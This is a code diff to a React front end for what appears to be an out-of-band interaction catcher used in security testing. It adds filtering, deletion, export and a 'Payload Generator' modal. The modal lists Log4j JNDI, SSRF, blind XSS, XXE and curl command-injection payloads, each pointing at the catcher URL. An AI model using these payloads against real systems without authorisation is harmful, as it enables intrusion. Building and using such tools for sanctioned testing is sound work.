@@ -13,6 +13,13 @@ export default function SonarCatcher() {
   const [error, setError] = useState(null);
   const [detailTab, setDetailTab] = useState('request');
   const [mainTab, setMainTab] = useState('pings');
+  const [searchTerm, setSearchTerm] = useState('');
+  const [protocolFilter, setProtocolFilter] = useState('ALL');
+  const [showExploitModal, setShowExploitModal] = useState(false);
+  const [alertConfig, setAlertConfig] = useState(null); // { message, onConfirm }
+  
+  // Audio object for sonar ping
+  const audioRef = useRef(new Audio('/sonar_ping.wav'));
 
   // Use refs to keep event handlers updated without re-rendering listeners
   const interactionsRef = useRef(interactions);
@@ -41,6 +48,14 @@ export default function SonarCatcher() {
         // Add to top of list
         const newInt = { ...data, id: Date.now() + Math.random() };
         setInteractions([newInt, ...interactionsRef.current]);
+        
+        // Play sonar ping sound
+        try {
+          audioRef.current.currentTime = 0;
+          audioRef.current.play();
+        } catch (e) {
+          console.error('Audio play failed:', e);
+        }
       });
     }
     return () => {
@@ -99,12 +114,83 @@ export default function SonarCatcher() {
   };
 
   const copyRawRequest = () => {
-    if (activeInteraction && activeInteraction.raw_request) {
-      navigator.clipboard.writeText(activeInteraction.raw_request);
-      setCopiedRaw(true);
-      setTimeout(() => setCopiedRaw(false), 2000);
+    if (activeInteraction) {
+      const data = detailTab === 'request' ? activeInteraction.raw_request : activeInteraction.raw_response;
+      if (data) {
+        navigator.clipboard.writeText(data);
+        setCopiedRaw(true);
+        setTimeout(() => setCopiedRaw(false), 2000);
+      }
     }
   };
+
+  const handleDeleteAll = () => {
+    setAlertConfig({
+      title: 'Clear All Pings',
+      message: 'Are you sure you want to delete all captured interactions? This cannot be undone.',
+      onConfirm: () => {
+        setInteractions([]);
+        setActiveInteraction(null);
+        setMainTab('pings');
+        setAlertConfig(null);
+      }
+    });
+  };
+
+  const handleDeleteSingle = (id, e) => {
+    e.stopPropagation();
+    setAlertConfig({
+      title: 'Delete Ping',
+      message: 'Delete this specific interaction?',
+      onConfirm: () => {
+        setInteractions(prev => prev.filter(int => int.id !== id));
+        if (activeInteraction?.id === id) {
+          setActiveInteraction(null);
+          setMainTab('pings');
+        }
+        setAlertConfig(null);
+      }
+    });
+  };
+
+  const handleExport = (format) => {
+    if (!activeInteraction) return;
+    
+    let content = '';
+    const filename = `sonar_${activeInteraction.protocol}_${Date.now()}`;
+    
+    if (format === 'json') {
+      content = JSON.stringify(activeInteraction, null, 2);
+    } else if (format === 'md') {
+      content = `# Sonar OOB Interaction\n\n`;
+      content += `**Protocol:** ${activeInteraction.protocol.toUpperCase()}\n`;
+      content += `**Remote IP:** ${activeInteraction.remote_address}\n`;
+      content += `**Timestamp:** ${new Date(activeInteraction.timestamp).toLocaleString()}\n\n`;
+      if (activeInteraction.query_type) content += `**Query Type:** ${activeInteraction.query_type}\n\n`;
+      content += `## Raw Request\n\`\`\`http\n${activeInteraction.raw_request || 'None'}\n\`\`\`\n\n`;
+      if (activeInteraction.raw_response) {
+        content += `## Raw Response\n\`\`\`http\n${activeInteraction.raw_response}\n\`\`\`\n`;
+      }
+    }
+
+    const blob = new Blob([content], { type: 'text/plain' });
+    const dl = document.createElement('a');
+    dl.href = URL.createObjectURL(blob);
+    dl.download = `${filename}.${format}`;
+    dl.click();
+  };
+
+  const filteredInteractions = interactions.filter(int => {
+    if (protocolFilter !== 'ALL' && int.protocol.toLowerCase() !== protocolFilter.toLowerCase()) return false;
+    if (searchTerm) {
+      const term = searchTerm.toLowerCase();
+      const ipMatch = int.remote_address.toLowerCase().includes(term);
+      const reqMatch = (int.raw_request || '').toLowerCase().includes(term);
+      const typeMatch = (int.query_type || '').toLowerCase().includes(term);
+      if (!ipMatch && !reqMatch && !typeMatch) return false;
+    }
+    return true;
+  });
 
   return (
     <div className="sonar-root">
@@ -157,50 +243,82 @@ export default function SonarCatcher() {
         <div className="sonar-stream-panel" style={{ width: '100%', minWidth: '100%', borderRight: 'none' }}>
           <div className="sonar-payload-card">
             <div className="sonar-payload-label">Your Unique Payload URL</div>
-            <div className="sonar-payload-box" onClick={copyUrl} style={{ cursor: 'pointer', position: 'relative', display: 'flex', alignItems: 'center' }}>
-              <span className={url ? 'active' : 'inactive'} style={{ paddingRight: '110px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
-                {url || 'Waiting for engine to start...'}
-              </span>
+            <div style={{ display: 'flex', gap: '12px' }}>
+              <div className="sonar-payload-box" onClick={copyUrl} style={{ flex: 1, cursor: 'pointer', position: 'relative', display: 'flex', alignItems: 'center' }}>
+                <span className={url ? 'active' : 'inactive'} style={{ paddingRight: '110px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                  {url || 'Waiting for engine to start...'}
+                </span>
+                <button 
+                  onClick={(e) => { e.stopPropagation(); copyUrl(); }}
+                  style={{
+                    position: 'absolute',
+                    right: '12px',
+                    background: copiedUrl ? 'rgba(16, 185, 129, 0.2)' : 'rgba(167, 139, 250, 0.2)',
+                    border: copiedUrl ? '1px solid #10B981' : '1px solid #a78bfa',
+                    color: copiedUrl ? '#10B981' : '#c4b5fd',
+                    padding: '6px 12px',
+                    borderRadius: '6px',
+                    fontSize: '12px',
+                    fontWeight: 'bold',
+                    display: 'flex',
+                    alignItems: 'center',
+                    gap: '6px',
+                    cursor: 'pointer'
+                  }}
+                >
+                  {copiedUrl ? <CheckCircle2 size={14} /> : <Copy size={14} />}
+                  {copiedUrl ? 'Copied' : 'Copy URL'}
+                </button>
+              </div>
               <button 
-                onClick={(e) => { e.stopPropagation(); copyUrl(); }}
-                style={{
-                  position: 'absolute',
-                  right: '12px',
-                  background: copiedUrl ? 'rgba(16, 185, 129, 0.2)' : 'rgba(167, 139, 250, 0.2)',
-                  border: copiedUrl ? '1px solid #10B981' : '1px solid #a78bfa',
-                  color: copiedUrl ? '#10B981' : '#c4b5fd',
-                  padding: '6px 12px',
-                  borderRadius: '6px',
-                  fontSize: '12px',
-                  fontWeight: 'bold',
-                  display: 'flex',
-                  alignItems: 'center',
-                  gap: '6px',
-                  cursor: 'pointer'
-                }}
+                className="sonar-exploit-btn"
+                disabled={!url}
+                onClick={() => setShowExploitModal(true)}
               >
-                {copiedUrl ? <CheckCircle2 size={14} /> : <Copy size={14} />}
-                {copiedUrl ? 'Copied' : 'Copy URL'}
+                <Zap size={14} /> Generator
               </button>
             </div>
           </div>
 
           <div className="sonar-list-header">
             <h3>Captured Interactions</h3>
-            <span className="sonar-badge">{interactions.length} Pings</span>
+            <div className="sonar-list-actions">
+              <span className="sonar-badge">{filteredInteractions.length} Pings</span>
+              <button className="sonar-icon-btn danger" onClick={handleDeleteAll} title="Clear All Pings"><Trash2 size={14}/></button>
+            </div>
+          </div>
+          
+          <div className="sonar-filters">
+            <input 
+              type="text" 
+              placeholder="Search IP, type, or payload..." 
+              value={searchTerm}
+              onChange={(e) => setSearchTerm(e.target.value)}
+              className="sonar-search-input"
+            />
+            <select 
+              value={protocolFilter} 
+              onChange={(e) => setProtocolFilter(e.target.value)}
+              className="sonar-protocol-select"
+            >
+              <option value="ALL">All Protocols</option>
+              <option value="HTTP">HTTP</option>
+              <option value="DNS">DNS</option>
+              <option value="SMTP">SMTP</option>
+            </select>
           </div>
 
           <div className="sonar-list-container">
-            {interactions.length === 0 ? (
+            {filteredInteractions.length === 0 ? (
               <div className="sonar-empty-state">
                 <Activity size={48} />
-                <div className="empty-title">{running ? 'Listening for pings...' : 'Engine offline'}</div>
+                <div className="empty-title">{running ? (interactions.length === 0 ? 'Listening for pings...' : 'No pings match filter') : 'Engine offline'}</div>
                 <div className="empty-sub">
                   {running ? 'Fire your payload at a target to see interactions appear here instantly.' : 'Click "Start Sonar Engine" to generate a payload.'}
                 </div>
               </div>
             ) : (
-              interactions.map((int, i) => (
+              filteredInteractions.map((int, i) => (
                 <div 
                   key={int.id} 
                   className={`sonar-list-item ${activeInteraction?.id === int.id ? 'active' : ''}`}
@@ -215,6 +333,7 @@ export default function SonarCatcher() {
                     <span className="sonar-item-ip">{int.remote_address}</span>
                     <span className="sonar-item-time">{new Date(int.timestamp).toLocaleTimeString()}</span>
                   </div>
+                  <button className="sonar-delete-btn" onClick={(e) => handleDeleteSingle(int.id, e)}><Trash2 size={12} /></button>
                 </div>
               ))
             )}
@@ -225,7 +344,13 @@ export default function SonarCatcher() {
           {activeInteraction ? (
             <div className="sonar-detail-content">
               <div className="sonar-detail-header">
-                <h2>Interaction Details</h2>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px' }}>
+                  <h2 style={{ margin: 0 }}>Interaction Details</h2>
+                  <div style={{ display: 'flex', gap: '8px' }}>
+                    <button className="sonar-export-btn" onClick={() => handleExport('json')}>JSON</button>
+                    <button className="sonar-export-btn" onClick={() => handleExport('md')}>Markdown</button>
+                  </div>
+                </div>
                 <div className="sonar-detail-badges">
                   <span className="sonar-badge proto">{activeInteraction.protocol.toUpperCase()}</span>
                   {activeInteraction.query_type && <span className="sonar-badge qtype">Type: {activeInteraction.query_type}</span>}
@@ -285,6 +410,60 @@ export default function SonarCatcher() {
         </div>
         )}
       </div>
+
+      {/* Exploit Generator Modal */}
+      {showExploitModal && (
+        <div className="sonar-modal-overlay" onClick={() => setShowExploitModal(false)}>
+          <div className="sonar-modal" onClick={e => e.stopPropagation()}>
+            <div className="sonar-modal-header">
+              <h3>Payload Generator</h3>
+              <button className="sonar-modal-close" onClick={() => setShowExploitModal(false)}>×</button>
+            </div>
+            <div className="sonar-modal-body">
+              <div className="sonar-payload-row">
+                <span className="sonar-payload-name">Log4j</span>
+                <div className="sonar-payload-code">{"${jndi:ldap://" + url + "/a}"}</div>
+                <button onClick={() => copyPayloadTemplate("${jndi:ldap://{{URL}}/a}")}><Copy size={14}/></button>
+              </div>
+              <div className="sonar-payload-row">
+                <span className="sonar-payload-name">SSRF</span>
+                <div className="sonar-payload-code">http://{url}</div>
+                <button onClick={() => copyPayloadTemplate("http://{{URL}}")}><Copy size={14}/></button>
+              </div>
+              <div className="sonar-payload-row">
+                <span className="sonar-payload-name">Blind XSS</span>
+                <div className="sonar-payload-code">{`"><script src="http://${url}"></script>`}</div>
+                <button onClick={() => copyPayloadTemplate(`"><script src="http://{{URL}}"></script>`)}><Copy size={14}/></button>
+              </div>
+              <div className="sonar-payload-row">
+                <span className="sonar-payload-name">XXE</span>
+                <div className="sonar-payload-code">{`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${url}"> ]>`}</div>
+                <button onClick={() => copyPayloadTemplate(`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{URL}}"> ]>`)}><Copy size={14}/></button>
+              </div>
+              <div className="sonar-payload-row">
+                <span className="sonar-payload-name">Cmd Injection</span>
+                <div className="sonar-payload-code">{`; curl http://${url} ;`}</div>
+                <button onClick={() => copyPayloadTemplate(`; curl http://{{URL}} ;`)}><Copy size={14}/></button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Custom Alert Modal */}
+      {alertConfig && (
+        <div className="sonar-alert-overlay">
+          <div className="sonar-alert-box">
+            <Trash2 size={32} color="#f87171" style={{ marginBottom: '16px' }} />
+            <h3>{alertConfig.title}</h3>
+            <p>{alertConfig.message}</p>
+            <div className="sonar-alert-actions">
+              <button className="sonar-alert-btn cancel" onClick={() => setAlertConfig(null)}>Cancel</button>
+              <button className="sonar-alert-btn confirm" onClick={alertConfig.onConfirm}>Delete</button>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
